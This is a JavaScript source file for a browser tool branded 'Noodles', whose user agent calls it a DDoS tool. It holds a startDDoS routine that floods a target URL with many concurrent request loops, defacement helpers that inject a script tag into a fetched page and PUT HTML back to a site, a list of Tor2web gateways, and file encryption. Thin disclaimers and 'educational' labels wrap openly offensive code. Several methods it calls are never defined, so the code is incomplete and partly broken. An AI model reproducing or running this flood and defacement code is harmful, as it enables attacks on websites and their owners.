class Tor {
    constructor() {
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.gatewayCheckInterval = 30000;
        this.userAgent = 'Noodles/1.0 (DDoS Tool)';
        this.customHeaders = {};
        this.requestQueue = [];
        this.isProcessingQueue = false;
        this.maxConcurrentRequests = 200;
        this.initRequestQueue();
        this.bypassCache = true;
        this.defaceScript = null;
        this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
        this.eventListeners = {};
        this.honeypotData = {};
        this.debug = false;
        this.requestStats = {
            sent: 0,
            success: 0,
            failed: 0,
            bytesSent: 0,
            bytesReceived: 0
        };
        this.statUpdateInterval = 500;
        this.startStatUpdates();
        this.serverIP = null;
        this.serverResponse = null;
        this.initServerInfo();
        this.errorThreshold = 50;
        this.errorCount = 0;
        this.rateLimitDelay = 2000;
        this.useTorForDeface = false;
        this.attackStartTime = null;
        this.attackEndTime = null;
        this.activeAttackType = null;
        this.targetURL = null;
        this.attackConfig = {};
        this.ddosThreads = [];
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
        this.checkGatewayOnFailure = true;

        // New properties and initialization for Noodles requirements
        this.fileEncryptionKey = null;
        this.isNoodlesInitialized = false;
        this.requireUserConsent();
        this.noodlesLogs = [];
        this.scanLinesEnabled = true;
        this.particlesEnabled = true;
        this.allActionsLogged = true;
        this.securityHeaders = {
            "Content-Security-Policy": "default-src 'self';",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Referrer-Policy": "no-referrer"
        };
        this.reportFindings = [];
        this.setupSecurityHeaders();
        this.initializeUI();
        this.NoodlesDisclaimer = "Noodles Inc. is NOT responsible for unauthorized use. Unauthorized use is illegal. Use at your own risk.";
        this.initializeNoodles();
    }

    // Noodles Initialization and Global Consent
    async initializeNoodles() {
        if (this.isNoodlesInitialized) return;
        if (confirm("Warning: Noodles contains tools that can be used for illegal activities. By proceeding, you acknowledge the risks and agree to use these tools responsibly and legally. Press 'OK' to continue, or 'Cancel' to close the site.")) {
            this.isNoodlesInitialized = true;
            this.logToConsole("Noodles initialized with user consent.");
            this.displayDisclaimer();
            this.startGatewayMonitoring();
        } else {
            this.closeSite();
        }
    }

    requireUserConsent() {
        window.addEventListener('beforeunload', (event) => {
            event.preventDefault();
            event.returnValue = "Warning: Closing this site may have unintended consequences. Are you sure you want to close Noodles?";
        });
    }

    closeSite() {
        window.close();
    }

    displayDisclaimer() {
        alert(this.NoodlesDisclaimer);
    }

    // Logging Functions
    logToConsole(message) {
        if (this.allActionsLogged) {
            console.log(`Noodles Log: ${message}`);
            this.noodlesLogs.push({ timestamp: new Date(), message: message });
        }
    }

    // Educational Information
    showEducationalInfo(toolName) {
        let info = "";
        switch (toolName) {
            case "Defacement":
                info = "Defacement Tool: Tests website security and allows temporary modification of websites for educational purposes. Always obtain permission before defacing any website.";
                break;
            case "DDoS":
                info = "DDoS Tool: Simulates a Distributed Denial of Service attack to evaluate a website's resilience under heavy traffic. Unauthorized DDoS attacks are illegal.";
                break;
            case "Encryption":
                info = "File Encryption Tool: Securely encrypts files to protect sensitive information. Ensure you have a backup and store decryption keys safely.";
                break;
            default:
                info = "No information available for this tool.";
        }
        alert(info);
        this.logToConsole(`Educational information displayed for ${toolName}.`);
    }

    // UI Enhancements
    applyDarkTheme() {
        document.body.style.backgroundColor = '#121212';
        document.body.style.color = '#FFFFFF';
        this.logToConsole("Dark theme applied.");
    }

    toggleScanLines() {
        this.scanLinesEnabled = !this.scanLinesEnabled;
        // Implementation for scan lines effect (CSS or Canvas)
        this.logToConsole(`Scan lines toggled ${this.scanLinesEnabled ? 'on' : 'off'}.`);
    }

    toggleParticles() {
        this.particlesEnabled = !this.particlesEnabled;
        // Implementation for particle effect (Canvas or library)
        this.logToConsole(`Particles toggled ${this.particlesEnabled ? 'on' : 'off'}.`);
    }

    // Security Headers Setup
    setupSecurityHeaders() {
        for (const header in this.securityHeaders) {
            if (this.securityHeaders.hasOwnProperty(header)) {
                document.head.appendChild(this.createMetaTag(header, this.securityHeaders[header]));
            }
        }
        this.logToConsole("Security headers applied.");
    }

    createMetaTag(header, content) {
        const meta = document.createElement('meta');
        meta.httpEquiv = header;
        meta.content = content;
        return meta;
    }

    // Reporting Feature
    addFinding(url, vulnerability, details) {
        this.reportFindings.push({ url, vulnerability, details, timestamp: new Date() });
        this.logToConsole(`Vulnerability reported: ${vulnerability} at ${url}`);
    }

    generateReport() {
        return JSON.stringify(this.reportFindings, null, 2);
    }

    // Defacement Tool Functions

    async backupWebsite(url) {
        try {
            const response = await this.rawFetch(url);
            if (!response.ok) {
                throw new Error(`Failed to backup website. Status: ${response.status}`);
            }
            const content = await response.text();
            const backupData = {
                url: url,
                timestamp: new Date(),
                content: content
            };
            this.logToConsole(`Website backed up: ${url}`);
            return JSON.stringify(backupData, null, 2);
        } catch (error) {
            this.logToConsole(`Backup failed: ${error}`);
            throw error;
        }
    }

    async restoreWebsite(backup) {
        try {
            const backupData = JSON.parse(backup);
            const url = backupData.url;
            const content = backupData.content;

            const putOptions = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: content,
                redirect: 'follow'
            };

            const putResponse = await this.rawFetch(url, putOptions);

            if (putResponse.ok) {
                this.logToConsole(`Website restored successfully: ${url}`);
            } else {
                throw new Error(`Failed to restore website. Status: ${putResponse.status}`);
            }
        } catch (error) {
            this.logToConsole(`Restore failed: ${error}`);
            throw error;
        }
    }

    async previewDefacement(url, script) {
        try {
            const response = await this.rawFetch(url);
            if (!response.ok) {
                throw new Error(`Failed to fetch website for preview. Status: ${response.status}`);
            }
            let targetContent = await response.text();
            const scriptTag = `<script>${script}</script>`;
            const injectionPoint = targetContent.indexOf('</body>');
            if (injectionPoint !== -1) {
                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
            } else {
                targetContent += scriptTag;
            }
            return targetContent;
        } catch (error) {
            this.logToConsole(`Preview failed: ${error}`);
            throw error;
        }
    }

    // DDoS Tool Functions
    async startDDoS(url, threads = 100, duration = 60) {
        this.startAttack('DDOS', url, { threads, duration });
        this.ddosThreads = [];

        const endTime = Date.now() + (duration * 1000);
        let requestCount = 0;

        const attackThread = async () => {
            while (Date.now() < endTime) {
                try {
                    const response = await this.rawFetch(url, { method: 'GET' });
                    if (!response.ok) {
                        this.log(`Request failed with status: ${response.status}`, 'warn');
                    }
                    requestCount++;
                } catch (error) {
                    this.log(`Request error: ${error}`, 'error');
                }
            }
        };

        for (let i = 0; i < threads; i++) {
            this.ddosThreads.push(attackThread());
        }

        await Promise.all(this.ddosThreads);

        this.endAttack('DDOS', url, { totalRequests: requestCount, threads });
        this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
    }

    stopDDoS() {
        this.stopAttack();
    }

    // File Encryption Tool Functions
    async encryptFile(file, key) {
        this.fileEncryptionKey = key;
        const reader = new FileReader();
        reader.onload = async (event) => {
            const fileData = new Uint8Array(event.target.result);
            const iv = window.crypto.getRandomValues(new Uint8Array(12));
            const cryptoKey = await this.deriveKey(key);
            try {
                const encryptedContent = await window.crypto.subtle.encrypt(
                    {
                        name: "AES-GCM",
                        iv: iv
                    },
                    cryptoKey,
                    fileData
                );
                const encryptedArray = new Uint8Array(encryptedContent);
                const completeArray = new Uint8Array(iv.length + encryptedArray.length);
                completeArray.set(iv);
                completeArray.set(encryptedArray, iv.length);

                const blob = new Blob([completeArray], { type: 'application/octet-stream' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = file.name + '.encrypted';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);

                this.logToConsole(`File ${file.name} encrypted successfully.`);

            } catch (e) {
                console.error("Encryption error:", e);
                this.logToConsole(`Encryption failed for ${file.name}: ${e}`);
            }
        };
        reader.onerror = (error) => {
            console.error("File reading error:", error);
            this.logToConsole(`File reading failed for ${file.name}: ${error}`);
        };
        reader.readAsArrayBuffer(file);
    }

    async decryptFile(file, key) {
        try {
            const reader = new FileReader();
            reader.onload = async (event) => {
                const encryptedData = new Uint8Array(event.target.result);
                const iv = encryptedData.slice(0, 12);
                const encryptedContent = encryptedData.slice(12);
                const cryptoKey = await this.deriveKey(key);

                try {
                    const decryptedContent = await window.crypto.subtle.decrypt(
                        {
                            name: "AES-GCM",
                            iv: iv
                        },
                        cryptoKey,
                        encryptedContent
                    );

                    const decryptedArray = new Uint8Array(decryptedContent);
                    const blob = new Blob([decryptedArray]);
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = file.name.replace('.encrypted', '');
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(url);

                    this.logToConsole(`File ${file.name} decrypted successfully.`);

                } catch (e) {
                    console.error("Decryption error:", e);
                    this.logToConsole(`Decryption failed for ${file.name}: ${e}`);
                }
            };
            reader.onerror = (error) => {
                console.error("File reading error:", error);
                this.logToConsole(`File reading failed for ${file.name}: ${error}`);
            };
            reader.readAsArrayBuffer(file);
        } catch (error) {
            console.error("Decryption setup error:", error);
            this.logToConsole(`Decryption setup failed: ${error}`);
        }
    }

    async deriveKey(key) {
        const encoder = new TextEncoder();
        const data = encoder.encode(key);
        const hash = await window.crypto.subtle.digest('SHA-256', data);
        return window.crypto.subtle.importKey(
            "raw",
            hash,
            "AES-GCM",
            false,
            ["encrypt", "decrypt"]
        );
    }

    // UI Initialization (Placeholder)
    initializeUI() {
        this.applyDarkTheme();
        this.logToConsole("UI initialized.");
    }
}

window.Tor = Tor;